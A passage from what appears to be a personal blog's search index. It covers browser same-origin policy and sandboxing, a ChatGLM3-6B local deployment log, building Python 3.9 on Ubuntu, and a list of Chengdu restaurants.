class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>通过jsonp来实现跨域请求</strong></p></li><li><p><strong>通过CORS（跨域资源共享）实现跨域请求</strong></p></li><li><p><strong>通过代理实现跨域请求</strong><br>我们都知道同源策略是浏览器自带的，那么我们如果要避免同源策略进行跨域请求，我们可以通过代理服务器的方式进行请求，例如我们请求一个与自身不同域的脚本文件，那么我们可以<strong>先请求与自身同域的一个 url ，然后通过代理服务器进行跳转， 最后返回由代理服务器请求到的脚本文件</strong></p></li></ol><blockquote><p>详细的例子归纳见：<a href="https://blog.csdn.net/l_ppp/article/details/106402136">https://blog.csdn.net/l_ppp/article/details/106402136</a></p></blockquote><h2 id="浏览器第三方插件的同源策略"><a href="#浏览器第三方插件的同源策略" class="headerlink" title="浏览器第三方插件的同源策略"></a>浏览器第三方插件的同源策略</h2><p>对于浏览器来说，浏览器加载的一些第三方插件也有各自的同源策略。</p><p>最常见的一些插件如Flash、Java Applet、Silverlight、Google Gears等都有自己的控制策略。</p><h1 id="浏览器沙箱（sandbox）"><a href="#浏览器沙箱（sandbox）" class="headerlink" title="浏览器沙箱（sandbox）"></a>浏览器沙箱（sandbox）</h1><p>以chrome浏览器为例，采用了<strong>多进程架构</strong>，主要进程包括：浏览器进程、渲染进程、插件进程和拓展进程。插件进程如flash、java、pdf 等与浏览器进程严格隔离，因此不会互相影响。</p><p>渲染引擎由Sandbox隔离，网页代码要与浏览器内核进程或操作系统进行通信都需要通过IPC channel，在其中会进行一些安全检查。</p><p>Sandbox（沙箱）：</p><ul><li><p>原理：Sandbox 的设计目的是为了<strong>让不可信任的代码运行在一定的环境中，限制不可信任的代码访问隔离区之外的资源。</strong>如果<strong>一定要跨越Sandbox边界产生数据交换，则只能通过指定的数据通道，比如经过封装的API来完成，在这些API中会严格检查请求的合法性</strong>。</p></li><li><p>应用实例：比如一个提供 hosting服务的共享主机环境，假设支持用户上传PHP、Python、Java等语言的代码，为了防止用户代码破坏系统环境，或者是不同用户之间的代码互相影响，则应该设计一个 Sandbox对用户代码进行隔离。Sandbox需要考虑用户代码针对本地文件系统、内存、数据库、网络的可能请求，可以采用默认拒绝的策略，对于有需要的请求，则可以通过封装API的方式实现。</p></li></ul><p>浏览器所加载的一些第三方插件往往不收sandbox管辖，近年来大部分的浏览器漏洞都是<strong>加载第三方插件</strong>导致的。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.cnblogs.com/zhengna/p/11428822.html">https://www.cnblogs.com/zhengna/p/11428822.html</a></li><li><a href="https://blog.csdn.net/t0410ch/article/details/125150202">https://blog.csdn.net/t0410ch/article/details/125150202</a></li><li><a href="https://blog.csdn.net/u012861467/article/details/79530629">https://blog.csdn.net/u012861467/article/details/79530629</a></li><li><a href="https://cloud.tencent.com/developer/article/1878652">https://cloud.tencent.com/developer/article/1878652</a></li><li><a href="https://www.cnblogs.com/edisonchou/p/edc_web_security_foundation_notes.html">https://www.cnblogs.com/edisonchou/p/edc_web_security_foundation_notes.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/348948397">https://zhuanlan.zhihu.com/p/348948397</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『工程记录』本地部署chatglm3-6b</title>
      <link href="/posts/d5ac.html"/>
      <url>/posts/d5ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="motivation"><a href="#motivation" class="headerlink" title="motivation"></a>motivation</h1><p>ChatGLM3-6B发布于2023年10月27日，是目前中文能力排名最高的开源LLM模型。对应项目的github地址：<a href="https://github.com/THUDM/ChatGLM3">https://github.com/THUDM/ChatGLM3</a></p><p>实验室项目中需要本地部署大模型用于新闻文本摘要任务，因为预测速度的要求及硬件条件的限制，比较后选择该模型的6B版本。</p><p>本文为在linux环境下的chatglm3-6b的本地部署工程记录。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="CUDA与CUDNN"><a href="#CUDA与CUDNN" class="headerlink" title="CUDA与CUDNN"></a>CUDA与CUDNN</h2><p>深度学习任务中，当使用GPU进行训练的时候，需要安装英伟达提供的驱动和显卡对应的cuda、cudnn。</p><h3 id="什么是cuda和cudnn？"><a href="#什么是cuda和cudnn？" class="headerlink" title="什么是cuda和cudnn？"></a>什么是cuda和cudnn？</h3><ul><li>CUDA(ComputeUnified Device Architecture)：是一种由NVIDIA推出的通用并行计算架构，该架构使GPU能够解决复杂的计算问题。</li><li>CUDNN：是用于深度神经网络的GPU加速库。它强调性能、易用性和低内存开销。NVIDIA cuDNN可以集成到更高级别的机器学习框架中，如谷歌的Tensorflow、torch</li></ul><p>需要注意的是，cuda、cudnn和我们常用的深度学习框架（如tensorflow-gpu、torch-gpu）之间的版本存在对应关系，如果配置错误则代码不能运行。</p><p>我们首先查看服务器上的显卡相关信息，在命令行输入：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure><p>可以看到显卡支持的最高CUDA版本为11.8（<strong>注意这里是显卡支持的最高CUDA版本，而并不是目前系统安装的CUDA版本</strong>！）</p><p>同时可以看到这台服务器上装载了两个显存大小都为24G的GPU 0和1，其中GPU 0的显存几乎已经完全占满。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122191115501.png" alt="image-20240122191115501"></p><p>输入以下命令，查看是否已经安装了cuda：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvcc -V</span><br></pre></td></tr></table></figure><p>如果出现 <code>Command &#39;nvcc&#39; not found, but can be installed with:</code> 的输出，说明该服务器的系统并没有安装cuda</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122193539449.png" alt="image-20240122193539449"></p><p>可以看到我这台服务器上面已经安装了cuda，版本为11.8，所以并不需要进行cuda和cudnn的安装</p><p><strong>如果你和我一样已经安装了cuda和cudnn，请跳转到下一部分，进行相对应torch-gpu的安装</strong></p><h3 id="cuda和cudnn的安装"><a href="#cuda和cudnn的安装" class="headerlink" title="cuda和cudnn的安装"></a>cuda和cudnn的安装</h3><p>这一部分我并没有进行，考虑后续有没有机会补上。</p><p>首先要创建一个Python ≥ 3.10的虚拟环境（chatglm3-6b要求）。</p><p>要注意虚拟环境中的cuda和系统中的cuda的区别，我这里的cuda就是直接安装在系统中，所有的虚拟环境都可以使用系统中安装的cuda</p><p>在虚拟环境中安装并使用其他版本的cuda，参考：<a href="https://blog.csdn.net/2301_80501457/article/details/134191613">https://blog.csdn.net/2301_80501457/article/details/134191613</a></p><blockquote><p>要注意：如果你的cuda是直接安装在虚拟环境中，并非直接安装在系统中。是无法使用ncvv -V命令验证是否安装成功的，ncvv -V是通过系统变量来直接查询，而安装在虚拟环境中并没有直接建立系统变量。验证方法可以见上面链接的最后一部分。</p></blockquote><h2 id="pytorch-gpu的安装"><a href="#pytorch-gpu的安装" class="headerlink" title="pytorch-gpu的安装"></a>pytorch-gpu的安装</h2><p>pytorch-gpu的版本同样必须依赖于CUDA的版本。</p><p>注意，<code>conda install pytorch</code> 命令安装的是torch CPU版本，但是我们要使用GPU进行训练</p><p>在<a href="https://pytorch.org/get-started/previous-versions/">pytorch官网</a>上获取cuda11.8对应版本torch的安装命令</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122103348292.png" alt="image-20240122103348292"></p><p>复制对应的命令，执行安装</p><p>安装完成后编写程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch <span class="comment"># 如果pytorch安装成功即可导入</span></span><br><span class="line"><span class="built_in">print</span>(torch.cuda.is_available()) <span class="comment"># 查看CUDA是否可用</span></span><br><span class="line"><span class="built_in">print</span>(torch.cuda.device_count()) <span class="comment"># 查看可用的CUDA数量</span></span><br><span class="line"><span class="built_in">print</span>(torch.version.cuda) <span class="comment"># 查看CUDA版本</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122195902702.png" alt="image-20240122195902702"></p><p>已经配置成功</p><h2 id="安装剩余依赖"><a href="#安装剩余依赖" class="headerlink" title="安装剩余依赖"></a>安装剩余依赖</h2><p>clone下来ChatGLM3项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/THUDM/ChatGLM3.git</span><br></pre></td></tr></table></figure><blockquote><p>超时的话挂梯子设置代理，使用服务器没办法挂梯子的话直接在github下载zip上传到服务器上</p></blockquote><p>由于已经安装了torch，所以我们要<strong>删掉项目目录下requirements.txt中的 <em>torch&gt;&#x3D;2.1.0</em> 一行</strong></p><p>并使用 pip 安装剩余的依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><blockquote><p>这里一定要删除torch相关依赖行！！不然会自动给你下载冲突的torch版本，后续项目报错</p></blockquote><h1 id="下载ChatGLM3-6b模型及参数"><a href="#下载ChatGLM3-6b模型及参数" class="headerlink" title="下载ChatGLM3-6b模型及参数"></a>下载ChatGLM3-6b模型及参数</h1><h2 id="方法1：从-Hugging-Face-Hub-下载模型"><a href="#方法1：从-Hugging-Face-Hub-下载模型" class="headerlink" title="方法1：从 Hugging Face Hub 下载模型"></a>方法1：从 Hugging Face Hub 下载模型</h2><p>首先需要安装Git LFS，否则会出现模型中的大型文件下载不完整的情况。</p><p>输入以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git lfs install</span><br></pre></td></tr></table></figure><p>若显示 <code>Git LFS initialized</code> ，说明已经安装。</p><p>可以使用git进行克隆，运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://huggingface.co/THUDM/chatglm3-6b</span><br></pre></td></tr></table></figure><p>如果下载比较慢或者超时，可以直接去<a href="https://huggingface.co/THUDM/chatglm3-6b">官网</a>下载模型再上传到服务器</p><h2 id="方法2：从-ModelScope-下载模型（推荐）"><a href="#方法2：从-ModelScope-下载模型（推荐）" class="headerlink" title="方法2：从 ModelScope 下载模型（推荐）"></a>方法2：从 ModelScope 下载模型（推荐）</h2><p>同样也可以在国内魔搭社区下载，一般不会超时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git lfs install</span><br><span class="line">git clone https://www.modelscope.cn/ZhipuAI/chatglm3-6b.git</span><br></pre></td></tr></table></figure><blockquote><p>注意，这里一定要<code>git lfs install</code>，虽然我查了这个命令仅仅只是用于验证是否安装了git lfs，但是我第一次从魔搭git clone的时候，没有使用这个命令产生了大文件下载不完整的情况，加上后没有再出现这样的问题，所以建议还是加上吧。</p></blockquote><h1 id="代码调用模型进行预测"><a href="#代码调用模型进行预测" class="headerlink" title="代码调用模型进行预测"></a>代码调用模型进行预测</h1><p>下载完成模型及参数文件后，我们将所有的文件放在一个文件夹<code>chatglm3-6b</code>里，然后将其放在项目文件夹ChatGLM3-main下</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122202232999.png" alt="image-20240122202232999"></p><p>然后我们可以在项目主目录下创建test.py文件，通过如下代码调用 ChatGLM 模型来生成对话：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModel</span><br><span class="line"></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&quot;chatglm3-6b/&quot;</span>, trust_remote_code=<span class="literal">True</span>)</span><br><span class="line">model = AutoModel.from_pretrained(<span class="string">&quot;chatglm3-6b/&quot;</span>, trust_remote_code=<span class="literal">True</span>, device=<span class="string">&#x27;cuda&#x27;</span>)</span><br><span class="line">model = model.<span class="built_in">eval</span>()</span><br><span class="line">response, history = model.chat(tokenizer, <span class="string">&quot;你好&quot;</span>, history=[])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;回答：&quot;</span>,response)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要根据上下文的情况下</span></span><br><span class="line"><span class="comment"># response, history = model.chat(tokenizer, &quot;晚上睡不着应该怎么办&quot;, history=history)</span></span><br><span class="line"><span class="comment"># print(response)</span></span><br></pre></td></tr></table></figure><blockquote><p>这里使用”chatglm3-6b&#x2F;“就是加载了该文件夹下的本地模型及文件</p></blockquote><p>在命令行输入，执行代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUDA_VISIBLE_DEVICES=1 python test.py</span><br></pre></td></tr></table></figure><blockquote><p>注意，这里的 <code>CUDA_VISIBLE_DEVICES=1</code> 的作用是指定使用 GPU 1 来跑模型，因为我们前面已经通过 <code>nvidia-smi</code> 知道 GPU 0 的显存已经基本占满了</p><p>cuda指定GPU、设置多GPU的方法：<a href="https://blog.csdn.net/OneQuestionADay/article/details/111691486">https://blog.csdn.net/OneQuestionADay/article/details/111691486</a></p></blockquote><h1 id="构建网页版demo"><a href="#构建网页版demo" class="headerlink" title="构建网页版demo"></a>构建网页版demo</h1><p>官方教程：<a href="https://github.com/THUDM/ChatGLM3/blob/main/composite_demo/README.md">https://github.com/THUDM/ChatGLM3/blob/main/composite_demo/README.md</a></p><p>安装 Jupyter 内核：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipython kernel install --name chatglm3-demo --user</span><br></pre></td></tr></table></figure><p>因为我们是本地下载的模型，所以需要先设置环境变量 <code>MODEL_PATH</code> 来指定从本地加载模型</p><p>直接在终端中输入如下命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export MODEL_PATH=//home/xjb/event/ChatGLM3-main/chatglm3-6b</span><br></pre></td></tr></table></figure><p>然后输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUDA_VISIBLE_DEVICES=1 streamlit run composite_demo/main.py</span><br></pre></td></tr></table></figure><blockquote><p>注意这里一样要在命令的前面加上 <code>CUDA_VISIBLE_DEVICES=1</code> 来设置使用的GPU</p></blockquote><p>运行结果：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122204008879.png" alt="image-20240122204008879"></p><p>如果你部署在了服务器上而不是本机，访问对应的network url既可使用网页demo</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122204313569.png" alt="image-20240122204313569"></p><p>现在你就拥有一个属于自己的本地大模型啦，因为该模型较轻量级，预测的速度还是比较快的，在未经过微调的情况下我直接将其用于新闻文本的摘要任务，大概1-2秒可以生成一篇文本的摘要，效果也比较不错，但是偶尔会出现中英文乱码的情况。</p><p>你也可以对其进行进一步的领域微调，使其更适合你的任务。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><p><a href="https://blog.csdn.net/qq_43705697/article/details/121618276">https://blog.csdn.net/qq_43705697/article/details/121618276</a></p></li><li><p><a href="https://blog.csdn.net/2301_80501457/article/details/134191613">https://blog.csdn.net/2301_80501457/article/details/134191613</a></p></li><li><p><a href="https://blog.csdn.net/m0_65814643/article/details/134510135?spm=1001.2014.3001.5501">https://blog.csdn.net/m0_65814643/article/details/134510135?spm=1001.2014.3001.5501</a></p></li><li><p><a href="https://blog.csdn.net/m0_65814643/article/details/134563092">https://blog.csdn.net/m0_65814643/article/details/134563092</a></p></li><li><p><a href="https://blog.csdn.net/OneQuestionADay/article/details/111691486">https://blog.csdn.net/OneQuestionADay/article/details/111691486</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『linux』ubuntu修改python版本</title>
      <link href="/posts/3bee.html"/>
      <url>/posts/3bee.html</url>
      
        <content type="html"><![CDATA[<p><strong>motivation：</strong></p><p>服务器系统为：ubuntu20.04</p><p>查看系统中自带的python版本，可以发现系统自带的python3版本为python3.8。</p><p>因为我们需要在服务器部署的项目依赖python版本&gt;&#x3D;3.9，与Python3.8不兼容，所以需要安装python3.9。</p><p>本文详细记录在Ubuntu20.04（其他版本步骤也一样）上编译安装指定版本Python解释器的过程和可能遇到的问题，及多个Python版本并存的使用方法。</p><h1 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h1><p>初次安装的时候，没有执行这个步骤，后续踩了比较多的坑，参考网上的文章后执行此步骤可以解决大部分的问题。</p><h2 id="更新系统软件"><a href="#更新系统软件" class="headerlink" title="更新系统软件"></a>更新系统软件</h2><p>在正式开始之前，建议首先检查系统软件是否均为最新，并更新到最新版本。</p><p>打开一个终端，输入以下命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 刷新软件包目录</span><br><span class="line">sudo apt update</span><br><span class="line"># 列出当前可用的更新</span><br><span class="line">sudo apt list --upgradable</span><br><span class="line"># 如上一步提示有可以更新的项目，则执行更新</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111170901524.png" alt="image-20240111170901524"></p><h2 id="安装GCC编译器"><a href="#安装GCC编译器" class="headerlink" title="安装GCC编译器"></a>安装GCC编译器</h2><p>打开一个终端，使用 apt 安装 GCC 编译器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 GCC 编译器</span></span><br><span class="line">sudo apt install gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查安装是否成功</span></span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 若显示出 GCC 版本则成功</span></span><br></pre></td></tr></table></figure><h2 id="安装其他依赖"><a href="#安装其他依赖" class="headerlink" title="安装其他依赖"></a>安装其他依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 刷新软件包目录</span></span><br><span class="line">sudo apt update</span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">sudo apt install build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev libbz2-dev liblzma-dev sqlite3 libsqlite3-dev tk-dev uuid-dev libgdbm-compat-dev</span><br></pre></td></tr></table></figure><p>注意，Python 的部分功能依赖于对应的库（如 OpenSSL、SQLite3、LZMA 等），如果在编译时未能找到这些库，仍然可能完成编译。此时的 Python 解释器看似可以工作，但在需要使用特定功能时就会出问题。例如 OpenSSL 出现问题会导致无法正常使用 pip。故建议按本节提示安装所有可选依赖项。</p><h1 id="查看系统自带python3版本"><a href="#查看系统自带python3版本" class="headerlink" title="查看系统自带python3版本"></a>查看系统自带python3版本</h1><p>在系统终端中输入：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/bin | grep python</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165216118.png" alt="image-20240111165216118"></p><p>可以看出使用系统的Python3指向版本python3.8</p><p>输入python3 –version可以查看详细版本信息</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165421131.png" alt="image-20240111165421131"></p><h1 id="下载安装python3-9"><a href="#下载安装python3-9" class="headerlink" title="下载安装python3.9"></a>下载安装python3.9</h1><h2 id="下载与解压"><a href="#下载与解压" class="headerlink" title="下载与解压"></a>下载与解压</h2><p>在<a href="https://www.python.org/ftp/python/%E4%B8%8B%E6%89%BE%E5%88%B0%E6%88%91%E4%BB%AC%E6%83%B3%E8%A6%81%E5%AE%89%E8%A3%85%E7%9A%84python3.9%E7%89%88%E6%9C%AC%E7%9A%84tgz%E5%AE%89%E8%A3%85%E5%8C%85">https://www.python.org/ftp/python/下找到我们想要安装的python3.9版本的tgz安装包</a></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165757616.png" alt="image-20240111165757616"></p><p>在终端中通过wget命令下载我们选择的安装包</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https://www.python.org/ftp/python/<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>/Python-<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure><p>解压安装包并进入目录（我这里选择解压到根目录下，读者可以自行选择解压路径）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf Python-<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>.tgz -C ~</span><br><span class="line"><span class="built_in">cd</span> Python-<span class="number">3</span>.<span class="number">8</span>.<span class="number">5</span></span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在Python-3.8.5目录下：</p><p>配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure</span><br></pre></td></tr></table></figure><p>编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make altinstall</span><br></pre></td></tr></table></figure><blockquote><p>这里使用应使用 <code>altinstall</code> 而不是 <code>install</code> 。</p><p>二者的一个重要区别在于，后者会创建符号链接，将 <code>python3</code> 等命令链接到正在安装的新版本 Python 3 上，这可能会破坏系统。更多信息请参阅当前目录下的 <code>README.rst</code> 文件。</p></blockquote><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><strong>有的文章可能会在这里让你删除掉原有的python环境或者是修改python3命令指向新安装的python3.8环境，由于 Ubuntu 系统、安装的其他软件等很可能会依赖于系统原有的python环境等原因，都不要进行此类修改！！！</strong></p><p>下面对安装完成的python环境进行测试</p><p>在命令行输入python3.9（注意不要分开），可以看到已经成功安装了。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111172737068.png" alt="image-20240111172737068"></p><p>如果要在python3.9环境下安装库的话，使用pip3.9即可</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111173117603.png" alt="image-20240111173117603"></p><p>后续如果想用python3.9环境来执行代码的话，在前面加上python3.9即可</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111173227176.png" alt="image-20240111173227176"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/506491209">https://zhuanlan.zhihu.com/p/506491209</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> unbuntu </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『成都』成都美食探店</title>
      <link href="/posts/1e32.html"/>
      <url>/posts/1e32.html</url>
      
        <content type="html"><![CDATA[<p>探店齁逼多，真假VV说。</p><p>已经在成都待了5年了，未来还有两年甚至也可能更久。这么长时间吃过的店铺也有不少了，这几天又有朋友要来成都找我玩，因为马上期末的缘故没有太多时间陪他们，就整理了一份这几年吃过的一些比较好吃的店铺，希望他们可以玩的开心！</p><h1 id="川菜"><a href="#川菜" class="headerlink" title="川菜"></a>川菜</h1><h2 id="鸡毛店"><a href="#鸡毛店" class="headerlink" title="鸡毛店"></a>鸡毛店</h2><ul><li><p>地点：天府宏</p></li><li><p>人均：50</p></li><li><p>评价：去过好几次了，味道很不错，注意有的店也叫鸡毛店但不一样，推荐天府宏的</p></li><li><p>推荐菜：</p><ul><li><p>蒜蓉生焖虾：必点，非常好吃</p></li><li><p>鸡丝凉面</p></li></ul></li></ul><h2 id="明婷饭店"><a href="#明婷饭店" class="headerlink" title="明婷饭店"></a>明婷饭店</h2><ul><li>地点：去过两个分店，都还可以</li><li>人均：60</li><li>评价：便宜，味道很不错，性价比高。</li><li>推荐菜：<ul><li>脑花豆腐：必点，特别下饭</li><li>奇香排骨：招牌</li></ul></li></ul><h2 id="陈麻婆豆腐"><a href="#陈麻婆豆腐" class="headerlink" title="陈麻婆豆腐"></a>陈麻婆豆腐</h2><ul><li>地点：总店在杜甫草堂对面</li><li>人均：60</li><li>评价：麻婆豆腐非常好吃，其他菜一般般。建议去总店！</li><li>推荐菜：<ul><li>麻婆豆腐：非遗</li></ul></li></ul><h2 id="永乐饭店"><a href="#永乐饭店" class="headerlink" title="永乐饭店"></a>永乐饭店</h2><ul><li>地点：武侯区</li><li>人均：50</li><li>评价：便宜好吃，网上评价都比较好，我还没吃过</li><li>推荐菜：<ul><li>照着招牌点就行</li></ul></li></ul><h1 id="翘脚牛肉"><a href="#翘脚牛肉" class="headerlink" title="翘脚牛肉"></a>翘脚牛肉</h1><h2 id="冯四嬢翘脚牛肉"><a href="#冯四嬢翘脚牛肉" class="headerlink" title="冯四嬢翘脚牛肉"></a>冯四嬢翘脚牛肉</h2><ul><li>地点：世豪广场</li><li>人均：30</li><li>评价：上次朋友来成都玩吃过一次，感觉比较好吃，牛肉很新鲜。</li><li>推荐菜：<ul><li>翘脚牛肉</li><li>鲜血旺</li><li>粉蒸牛肉</li></ul></li></ul><h1 id="烧烤"><a href="#烧烤" class="headerlink" title="烧烤"></a>烧烤</h1><h2 id="新奥尔良烧烤"><a href="#新奥尔良烧烤" class="headerlink" title="新奥尔良烧烤"></a>新奥尔良烧烤</h2><ul><li>地点：（这家店地图上搜不到，可以搜索生火火地摊小炉子烧烤，再旁边），在玉林西路</li><li>人均：60</li><li>评价：烤翅神中神，其他的也不错</li><li>推荐菜：<ul><li>烤翅</li><li>让老板娘帮着拿，都不错</li></ul></li></ul><h1 id="美蛙鱼"><a href="#美蛙鱼" class="headerlink" title="美蛙鱼"></a>美蛙鱼</h1><h2 id="味之绝"><a href="#味之绝" class="headerlink" title="味之绝"></a>味之绝</h2><ul><li>地点：连锁店，哪里都有</li><li>人均：60</li><li>评价：味道不错</li></ul><h1 id="冒烤鸭"><a href="#冒烤鸭" class="headerlink" title="冒烤鸭"></a>冒烤鸭</h1><h2 id="回味冒烤鸭"><a href="#回味冒烤鸭" class="headerlink" title="回味冒烤鸭"></a>回味冒烤鸭</h2><ul><li>地点：回味冒烤鸭（川大店）</li><li>人均：20</li><li>评价：价格便宜，好吃</li></ul><h1 id="火锅"><a href="#火锅" class="headerlink" title="火锅"></a>火锅</h1><p>感觉火锅味道都差不多？</p><h2 id="矮板凳"><a href="#矮板凳" class="headerlink" title="矮板凳"></a>矮板凳</h2><ul><li>地点：连锁，哪里都有</li><li>人均：70</li><li>评价：实验室聚餐去吃过几次，味道还可以，价格也还行</li></ul><h2 id="星鸿社"><a href="#星鸿社" class="headerlink" title="星鸿社"></a>星鸿社</h2><ul><li>地点：建设路&#x2F;电子科技大学</li><li>人均：100+</li><li>评价：一家重庆老火锅。上次朋友来玩一起去吃过，味道很好，但是价格比较贵。</li></ul><h1 id="串串"><a href="#串串" class="headerlink" title="串串"></a>串串</h1><h2 id="六年二班串串"><a href="#六年二班串串" class="headerlink" title="六年二班串串"></a>六年二班串串</h2><ul><li><p>地点：人民公园店</p></li><li><p>人均：40</p></li><li><p>评价：本地人舍友推荐，还没去过</p></li></ul><h1 id="小龙虾"><a href="#小龙虾" class="headerlink" title="小龙虾"></a>小龙虾</h1><h2 id="龙虾一绝"><a href="#龙虾一绝" class="headerlink" title="龙虾一绝"></a>龙虾一绝</h2><ul><li>地点：玉林西路</li><li>人均：70</li><li>评价：本地人舍友推荐的一家龙虾店，去吃过一次，价格较贵，感觉一般般，也有可能是我点的是微辣的原因。</li></ul><h1 id="小吃"><a href="#小吃" class="headerlink" title="小吃"></a>小吃</h1><h2 id="建设北路"><a href="#建设北路" class="headerlink" 